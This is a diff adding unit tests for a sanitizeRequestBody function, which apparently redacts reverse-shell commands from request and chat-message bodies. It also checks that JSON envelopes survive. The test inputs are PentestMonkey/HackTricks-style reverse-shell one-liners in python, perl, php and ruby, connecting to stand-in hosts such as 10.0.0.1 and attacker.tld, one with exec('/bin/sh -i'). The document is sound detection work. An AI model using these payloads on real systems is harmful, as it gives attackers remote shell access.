@@ -203,13 +203,75 @@ describe('sanitizeRequestBody — positive cases (3.9 language reverse shells)',
   })
 
   test('redacts php -r "...fsockopen..."', () => {
-    const input = `php -r '$sock=fsockopen("10.0.0.1",4242);'`
-    expect(sanitizeRequestBody(input)).toMatch(/^\{\{redacted-php-reverse-shell\}\}/)
+    const input = `php -r '$sock=fsockopen(host,4242);'`
+    expect(sanitizeRequestBody(input)).toBe('{{redacted-php-reverse-shell}}')
   })
 
   test('redacts ruby -rsocket -e "..."', () => {
     const input = `ruby -rsocket -e 'exit if fork; c=TCPSocket.new(addr,port); end'`
     expect(sanitizeRequestBody(input)).toBe('{{redacted-ruby-reverse-shell}}')
+  })
+
+  // Sanity tests using real-world mixed-quote payloads (outer `'`, inner `"`).
+  // These are the canonical PentestMonkey/HackTricks reverse-shell forms and
+  // are now covered thanks to the split Single/Double quote regex variants —
+  // each variant uses only one quote type internally, so mixing the opposite
+  // quote inside the construct is fine, while JSON-envelope safety is
+  // preserved (a Single regex can't consume a structural JSON `"` because it
+  // requires a `'` to close).
+  test('paired-quote sanity: python mixed-quote real-world payload redacted', () => {
+    const input = `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",4242))'`
+    expect(sanitizeRequestBody(input)).toBe('{{redacted-python-reverse-shell}}')
+  })
+
+  test('paired-quote sanity: perl mixed-quote real-world payload redacted', () => {
+    const input = `perl -e 'use Socket; $i="10.0.0.1"; $p=4242;'`
+    expect(sanitizeRequestBody(input)).toBe('{{redacted-perl-reverse-shell}}')
+  })
+
+  test('paired-quote sanity: php mixed-quote real-world payload redacted', () => {
+    const input = `php -r '$sock=fsockopen("10.0.0.1",4242); exec("/bin/sh -i");'`
+    expect(sanitizeRequestBody(input)).toBe('{{redacted-php-reverse-shell}}')
+  })
+
+  test('paired-quote sanity: ruby mixed-quote real-world payload redacted', () => {
+    const input = `ruby -rsocket -e 'exit if fork; c=TCPSocket.new("10.0.0.1",4242)'`
+    expect(sanitizeRequestBody(input)).toBe('{{redacted-ruby-reverse-shell}}')
+  })
+
+  // PentestMonkey/HackTricks-style mixed-quote payloads — locks in coverage
+  // of the canonical real-world reverse-shell signatures.
+  test('PentestMonkey: python mixed-quote reverse shell redacted', () => {
+    const input = `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("attacker.tld",4242)); os.dup2(s.fileno(),0)'`
+    expect(sanitizeRequestBody(input)).toBe('{{redacted-python-reverse-shell}}')
+  })
+
+  test('PentestMonkey: perl mixed-quote reverse shell redacted', () => {
+    const input = `perl -e 'use Socket; $i="10.0.0.1"; $p=4242; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'`
+    expect(sanitizeRequestBody(input)).toBe('{{redacted-perl-reverse-shell}}')
+  })
+
+  test('HackTricks: php mixed-quote reverse shell redacted', () => {
+    const input = `php -r '$sock=fsockopen("10.0.0.1",4242); fwrite($sock,"hi");'`
+    expect(sanitizeRequestBody(input)).toBe('{{redacted-php-reverse-shell}}')
+  })
+
+  test('PentestMonkey: ruby mixed-quote reverse shell redacted', () => {
+    const input = `ruby -rsocket -e 'exit if fork; c=TCPSocket.new("10.0.0.1",4242); while(cmd=c.gets); end'`
+    expect(sanitizeRequestBody(input)).toBe('{{redacted-ruby-reverse-shell}}')
+  })
+
+  // Double-quoted variants (less common but valid). Fire on raw text input.
+  // In JSON-serialized bodies the leading `\"` blocks the regex (deferred per
+  // spec section 4) — these tests just demonstrate raw-text coverage.
+  test('redacts python -c "..." (double-quoted variant, no inner single quote)', () => {
+    const input = `python -c "import socket,subprocess,os; s=socket.socket()"`
+    expect(sanitizeRequestBody(input)).toBe('{{redacted-python-reverse-shell}}')
+  })
+
+  test('redacts php -r "..." (double-quoted variant, inner single quotes ok)', () => {
+    const input = `php -r "<?php fsockopen('h', 80); ?>"`
+    expect(sanitizeRequestBody(input)).toBe('{{redacted-php-reverse-shell}}')
   })
 })
 
@@ -421,5 +483,48 @@ describe('sanitizeRequestBody — JSON-body integrity (Cursor-flagged regression
     const sanitized = sanitizeRequestBody(body)
     expect(() => JSON.parse(sanitized)).not.toThrow()
     expect(sanitized).toContain('{{redacted-shell}}')
+  })
+
+  // 3.9 family: unmatched `'` in content (e.g. truncated security blog
+  // snippets) must NOT consume the JSON structural `"`. The split Single/
+  // Double regex variants each use only one quote type internally, so the
+  // Single variant requires a `'` to close — an unmatched single quote
+  // simply produces no match and the body is unchanged. The Double variant
+  // can't fire on JSON-serialized bodies because the value's opening `"`
+  // is escaped as `\"` and the leading `\` blocks the regex.
+  test('3.9 python -c with unmatched single quote — preserves JSON envelope', () => {
+    const body = JSON.stringify({
+      messages: [{ role: 'user', content: `python -c 'import socket,subprocess and more text` }],
+    })
+    const sanitized = sanitizeRequestBody(body)
+    expect(() => JSON.parse(sanitized)).not.toThrow()
+    expect(sanitized).toBe(body)
+  })
+
+  test('3.9 perl -e with unmatched single quote — preserves JSON envelope', () => {
+    const body = JSON.stringify({
+      messages: [{ role: 'user', content: `perl -e 'use Socket and more text` }],
+    })
+    const sanitized = sanitizeRequestBody(body)
+    expect(() => JSON.parse(sanitized)).not.toThrow()
+    expect(sanitized).toBe(body)
+  })
+
+  test('3.9 php -r with unmatched single quote — preserves JSON envelope', () => {
+    const body = JSON.stringify({
+      messages: [{ role: 'user', content: `php -r '$sock=fsockopen and more text` }],
+    })
+    const sanitized = sanitizeRequestBody(body)
+    expect(() => JSON.parse(sanitized)).not.toThrow()
+    expect(sanitized).toBe(body)
+  })
+
+  test('3.9 ruby -rsocket -e with unmatched single quote — preserves JSON envelope', () => {
+    const body = JSON.stringify({
+      messages: [{ role: 'user', content: `ruby -rsocket -e 'exit if fork and more text` }],
+    })
+    const sanitized = sanitizeRequestBody(body)
+    expect(() => JSON.parse(sanitized)).not.toThrow()
+    expect(sanitized).toBe(body)
   })
 })
